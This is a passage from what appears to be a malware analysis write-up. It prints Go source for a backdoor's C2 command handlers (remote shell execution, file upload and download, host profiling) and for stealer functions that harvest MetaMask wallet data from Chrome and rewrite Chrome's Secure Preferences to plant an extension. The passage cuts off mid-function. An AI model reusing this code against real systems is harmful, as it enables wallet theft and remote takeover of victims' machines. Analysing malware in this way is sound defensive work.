			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_AUTO</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processAuto</span><span class="p">(</span><span class="n">cmd_data</span><span class="p">)</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_WAIT</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processWait</span><span class="p">(</span><span class="n">cmd_data</span><span class="p">)</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_WAIT</span><span class="o">:</span>
				<span class="n">alive</span> <span class="o">=</span> <span class="no">false</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processExit</span><span class="p">()</span>
			<span class="k">default</span><span class="o">:</span>
				<span class="nb">panic</span><span class="p">(</span><span class="s">"problem"</span><span class="p">)</span>
			<span class="p">}</span>

			<span class="n">msg</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">MakeMsg</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span><span class="p">)</span>
			<span class="n">cmd</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">transport</span><span class="o">.</span><span class="n">HtxpExchange</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
			<span class="n">cmd_type</span><span class="p">,</span> <span class="n">cmd_data</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">DecodeMsg</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
		<span class="p">}()</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processExit</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"exited"</span><span class="p">),</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processAuto</span><span class="p">(</span><span class="n">data</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">var</span> <span class="p">(</span>
		<span class="n">msg_type</span> <span class="kt">string</span>
		<span class="n">msg_data</span> <span class="p">[][]</span><span class="kt">byte</span>
	<span class="p">)</span>

	<span class="n">mode</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>

	<span class="k">switch</span> <span class="n">mode</span> <span class="p">{</span>
	<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">AUTO_CHROME_GATHER</span><span class="o">:</span>
		<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">AutoModeChromeGather</span><span class="p">()</span>
	<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">AUTO_CHROME_PREFRST</span><span class="o">:</span>
		<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">AutoModeChromeChangeProfile</span><span class="p">()</span>
	<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">AUTO_CHROME_COOKIE</span><span class="o">:</span>
		<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">AutoModeChromeCookie</span><span class="p">()</span>
	<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">AUTO_CHROME_KEYCHAIN</span><span class="o">:</span>
		<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">auto</span><span class="o">.</span><span class="n">AutoModeMacChromeLoginData</span><span class="p">()</span>
	<span class="k">default</span><span class="o">:</span>
		<span class="n">msg_type</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span>
		<span class="n">msg_data</span> <span class="o">=</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_FAIL</span><span class="p">),</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"unknown auto mode"</span><span class="p">)}</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processOsShell</span><span class="p">(</span><span class="n">data</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">mode</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">])</span> <span class="c">// mode</span>
	<span class="n">timeout</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">ParseInt</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">1</span><span class="p">]),</span> <span class="m">16</span><span class="p">,</span> <span class="m">64</span><span class="p">)</span>
	<span class="n">shell</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">2</span><span class="p">])</span>
	<span class="n">args</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">string</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">3</span><span class="o">:</span><span class="p">]))</span>
	<span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">elem</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span><span class="p">[</span><span class="m">3</span><span class="o">:</span><span class="p">]</span> <span class="p">{</span>
		<span class="n">args</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="kt">string</span><span class="p">(</span><span class="n">elem</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">mode</span> <span class="o">==</span> <span class="n">config</span><span class="o">.</span><span class="n">SHELL_MODE_WAITGETOUT</span> <span class="p">{</span> <span class="c">// wait and get result mode</span>

		<span class="n">ctx</span><span class="p">,</span> <span class="n">cancel</span> <span class="o">:=</span> <span class="n">context</span><span class="o">.</span><span class="n">WithTimeout</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">Background</span><span class="p">(),</span> <span class="n">time</span><span class="o">.</span><span class="n">Duration</span><span class="p">(</span><span class="n">timeout</span><span class="p">))</span>
		<span class="k">defer</span> <span class="n">cancel</span><span class="p">()</span>

		<span class="n">cmd</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">CommandContext</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="n">args</span><span class="o">...</span><span class="p">)</span>
		<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>

		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
			<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_FAIL</span><span class="p">),</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()),</span>
			<span class="p">}</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">),</span>
				<span class="n">out</span><span class="p">,</span>
			<span class="p">}</span>
		<span class="p">}</span>

	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c">// start and detach mode</span>

		<span class="n">c</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">args</span><span class="o">...</span><span class="p">)</span>
		<span class="n">err</span> <span class="o">:=</span> <span class="n">c</span><span class="o">.</span><span class="n">Start</span><span class="p">()</span>

		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
			<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_FAIL</span><span class="p">),</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()),</span>
			<span class="p">}</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">),</span>
				<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="s">" "</span><span class="p">))),</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>

<span class="p">}</span>

<span class="k">func</span> <span class="n">processDownload</span><span class="p">(</span><span class="n">data</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="k">var</span> <span class="n">file_data</span> <span class="p">[]</span><span class="kt">byte</span>
	<span class="k">var</span> <span class="n">err</span> <span class="kt">error</span>

	<span class="n">path</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="n">_</span><span class="p">,</span> <span class="n">file</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

	<span class="n">info</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Stat</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">IsDir</span><span class="p">()</span> <span class="p">{</span>
		<span class="k">var</span> <span class="n">buf</span> <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
		<span class="n">err</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">Compress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="n">path</span><span class="p">},</span> <span class="no">false</span><span class="p">)</span>

		<span class="n">file</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s.tar.gz"</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
		<span class="n">file_data</span> <span class="o">=</span> <span class="n">buf</span><span class="o">.</span><span class="n">Bytes</span><span class="p">()</span>

	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">file_data</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_FILE</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">),</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">file</span><span class="p">),</span> <span class="n">file_data</span><span class="p">}</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_FILE</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_FAIL</span><span class="p">),</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())}</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processWait</span><span class="p">(</span><span class="n">data</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">duration</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">ParseInt</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">]),</span> <span class="m">16</span><span class="p">,</span> <span class="m">64</span><span class="p">)</span>

	<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Duration</span><span class="p">(</span><span class="n">duration</span><span class="p">))</span>

	<span class="n">send_data</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">128</span><span class="p">)</span>
	<span class="n">rand</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_PING</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span><span class="n">send_data</span><span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processUpload</span><span class="p">(</span><span class="n">data</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="k">var</span> <span class="n">log</span> <span class="kt">string</span>
	<span class="k">var</span> <span class="n">state</span> <span class="kt">string</span>

	<span class="n">path</span> <span class="o">:=</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
	<span class="n">buf</span> <span class="o">:=</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">1</span><span class="p">])</span>

	<span class="n">err</span> <span class="o">:=</span> <span class="n">util</span><span class="o">.</span><span class="n">Decompress</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="n">log</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s : %d"</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="m">1</span><span class="p">]))</span>
		<span class="n">state</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">log</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s : %s"</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
		<span class="n">state</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">LOG_FAIL</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_LOG</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">state</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">log</span><span class="p">),</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processInfo</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">user</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">user</span><span class="o">.</span><span class="n">Current</span><span class="p">()</span>
	<span class="n">host</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Hostname</span><span class="p">()</span>
	<span class="n">os</span> <span class="o">:=</span> <span class="n">runtime</span><span class="o">.</span><span class="n">GOOS</span>
	<span class="n">arch</span> <span class="o">:=</span> <span class="n">runtime</span><span class="o">.</span><span class="n">GOARCH</span>

	<span class="nb">print</span><span class="p">(</span><span class="s">"user: "</span> <span class="o">+</span> <span class="n">user</span><span class="o">.</span><span class="n">Username</span> <span class="o">+</span> <span class="s">", host: "</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">", os: "</span> <span class="o">+</span> <span class="n">os</span> <span class="o">+</span> <span class="s">", arch: "</span> <span class="o">+</span> <span class="n">arch</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

	<span class="n">data</span> <span class="o">:=</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">{</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">Username</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">host</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">os</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">arch</span><span class="p">),</span>
		<span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">DAEMON_VERSION</span><span class="p">),</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_INFO</span><span class="p">,</span> <span class="n">data</span>
<span class="p">}</span>
</pre></table></code></div></div><h1 id="stealer-activity">Stealer Activity</h1><p>COMMAND_AUTO (“r4ys”) can execute various stealer sub-commands:</p><ul><li>AUTO_CHROME_GATHER (“89io”)</ul><p>This command walks the Chrome user data directory, with a path dependent on the operating system, and it locates a file that matches the name <code class="language-plaintext highlighter-rouge">nkbihfbeogaeaoehlefnkodbefgpgknn</code> in the <code class="language-plaintext highlighter-rouge">Local Extension Settings</code> folder. If found, it compresses and returns its content as <code class="language-plaintext highlighter-rouge">gather.tar.gz</code>. This seems to be targeting the MetaMask Wallet extension.</p><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">AutoModeChromeGather</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
	<span class="nb">print</span><span class="p">(</span><span class="s">"===========	AutoModeChromeGather ==========="</span><span class="p">,</span> <span class="n">runtime</span><span class="o">.</span><span class="n">GOOS</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	
	<span class="k">var</span> <span class="p">(</span>
		<span class="n">buf</span>          <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
		<span class="n">userdata_dir</span> <span class="kt">string</span>
		<span class="n">path_list</span>    <span class="p">[]</span><span class="kt">string</span>
	<span class="p">)</span>

	<span class="c">// gather</span>
	<span class="n">userdata_dir</span> <span class="o">=</span> <span class="n">getUserdataDir</span><span class="p">()</span>

	<span class="c">// file system search</span>
	<span class="n">_</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Walk</span><span class="p">(</span><span class="n">userdata_dir</span><span class="p">,</span> <span class="k">func</span><span class="p">(</span><span class="n">path</span> <span class="kt">string</span><span class="p">,</span> <span class="n">info</span> <span class="n">os</span><span class="o">.</span><span class="n">FileInfo</span><span class="p">,</span> <span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
		<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">Name</span><span class="p">()</span> <span class="o">==</span> <span class="n">extension_dir</span> <span class="o">&amp;&amp;</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"Local Extension Settings"</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">path_list</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">path_list</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="no">nil</span>
	<span class="p">})</span>

	<span class="n">_</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">Compress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">path_list</span><span class="p">,</span> <span class="no">true</span><span class="p">)</span>

	<span class="nb">print</span><span class="p">(</span><span class="s">"===========	End ===========</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

	<span class="c">// return</span>
	<span class="n">data</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([][]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">3</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">LOG_SUCCESS</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"gather.tar.gz"</span><span class="p">)</span>
	<span class="n">data</span><span class="p">[</span><span class="m">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="o">.</span><span class="n">Bytes</span><span class="p">()</span>
	<span class="n">msg_type</span> <span class="o">:=</span> <span class="n">config</span><span class="o">.</span><span class="n">MSG_FILE</span>

	<span class="k">return</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">data</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li>AUTO_CHROME_PREFRST (“7ujm”)</ul><p>This command allows for the update of Chrome preferences. It locates the user directory, searches for Chrome’s <code class="language-plaintext highlighter-rouge">Secure Preferences</code> file, kills Chrome, and uses the <a href="https://github.com/Jeffail/gabs">gabs</a> library to edit the <code class="language-plaintext highlighter-rouge">Secure Preferences</code> JSON file. The edits seem to target settings for the MetaMask wallet, as it targets extension_hash_key <code class="language-plaintext highlighter-rouge">protection.macs.extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn</code> and extension_setting_key <code class="language-plaintext highlighter-rouge">extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn</code>. The updates include a new hash key and new settings via injected JSON content. This is likely used for the deployment of a malicious extension.</p><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">AutoModeChromeChangeProfile</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="p">[][]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>

	<span class="k">var</span> <span class="n">path_list</span> <span class="p">[]</span><span class="kt">string</span>

	<span class="c">//get user data dir</span>
	<span class="n">userdata_dir</span> <span class="o">:=</span> <span class="n">getUserdataDir</span><span class="p">()</span>

	<span class="c">// search and list prefs</span>
	<span class="n">_</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Walk</span><span class="p">(</span><span class="n">userdata_dir</span><span class="p">,</span> <span class="k">func</span><span class="p">(</span><span class="n">path</span> <span class="kt">string</span><span class="p">,</span> <span class="n">info</span> <span class="n">os</span><span class="o">.</span><span class="n">FileInfo</span><span class="p">,</span> <span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
		<span class="k">if</span> <span class="n">info</span><span class="o">.</span><span class="n">Name</span><span class="p">()</span> <span class="o">==</span> <span class="n">secure_preference_file</span> <span class="p">{</span>
			<span class="n">path_list</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">path_list</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
		<span class="p">}</span>

		<span class="k">return</span> <span class="no">nil</span>
	<span class="p">})</span>

	<span class="c">// chrome kill</span>
	<span class="k">if</span> <span class="n">runtime</span><span class="o">.</span><span class="n">GOOS</span> <span class="o">==</span> <span class="s">"windows"</span> <span class="p">{</span>
		<span class="n">cmd</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">,</span> <span class="s">"/c"</span><span class="p">,</span> <span class="s">"taskkill /f /im chrome.exe"</span><span class="p">)</span>
		<span class="n">cmd</span><span class="o">.</span><span class="n">Run</span><span class="p">()</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="n">cmd</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"killall chrome"</span><span class="p">)</span>
		<span class="n">cmd</span><span class="o">.</span><span class="n">Run</span><span class="p">()</span>
	<span class="p">}</span>

	<span class="c">// change prefs</span>
	<span class="n">changep</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">gabs</span><span class="o">.</span><span class="n">ParseJSON</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">getExtJsonString</span><span class="p">()))</span>
	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">path</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">path_list</span> <span class="p">{</span>
		<span class="n">prefp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gabs</span><span class="o">.</span><span class="n">ParseJSONFile</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
			<span class="k">continue</span>
		<span class="p">}</span>

		<span class="n">ok</span> <span class="o">:=</span> <span class="n">prefp</span><span class="o">.</span><span class="n">ExistsP</span><span class="p">(</span><span class="n">extension_hash_key</span><span class="p">)</span>
		<span class="k">if</span> <span class="o">!</span><span class="n">ok</span> <span class="p">{</span>
			<span class="k">continue</span>
		<span class="p">}</span>

		<span class="n">prefp</span><span class="o">.</span><span class="n">SetP</span><span class="p">(</span><span class="n">changep</span><span class="p">,</span> <span class="n">extension_setting_key</span><span class="p">)</span>
